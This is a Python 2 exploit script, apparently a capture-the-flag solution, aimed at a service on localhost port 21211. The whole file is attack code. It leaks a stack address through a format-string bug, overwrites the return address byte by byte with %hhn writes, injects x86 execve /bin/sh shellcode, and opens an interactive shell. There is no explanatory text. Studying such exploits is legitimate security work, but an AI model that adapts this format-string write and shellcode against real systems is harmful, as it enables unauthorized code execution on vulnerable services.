import socket
import struct
import time
import telnetlib


HOST="localhost"
PORT=21211

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((HOST,PORT))

print "[*] Connected to %s:%d"%(HOST,PORT)
print "[*] STAGE1"

data=sock.recv(512)

sock.send("%5$p\n")

buf_addr=int(sock.recv(10),16)
print "[+] Leak buffer address:0x%x"%buf_addr

data=sock.recv(512)

buf=struct.pack("<I",buf_addr-0xb)
buf+="%7$hhn\n"

sock.send(buf)
print "[+] Change the reading byte"

print "[*] STAGE2"
data=sock.recv(512)

ret_addr=buf_addr-0x20
print "[+] Leak return address:0x%x"%ret_addr


shellcode="\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"

buf=struct.pack("<I",ret_addr)
buf+=struct.pack("<I",ret_addr+1)
buf+=struct.pack("<I",ret_addr+2)
buf+=struct.pack("<I",ret_addr+3)
buf+=shellcode

shell_addr=[
buf_addr+0x10 >>  0 &0xff,
buf_addr+0x10 >>  8 &0xff,
buf_addr+0x10 >> 16 &0xff,
buf_addr+0x10 >> 24 &0xff,
]

buf+="%%%dc%%7$hhn" %((shell_addr[0]-len(buf))&0xff)
buf+="%%%dc%%8$hhn" %((shell_addr[1]-shell_addr[0])&0xff)
buf+="%%%dc%%9$hhn" %((shell_addr[2]-shell_addr[1])&0xff)
buf+="%%%dc%%10$hhn"%((shell_addr[3]-shell_addr[2])&0xff)
buf+="\n"

print "[+] Sending payload"
sock.send(buf)

print"[*] Shell started"

t=telnetlib.Telnet()
t.sock=sock
t.interact()
sock.close()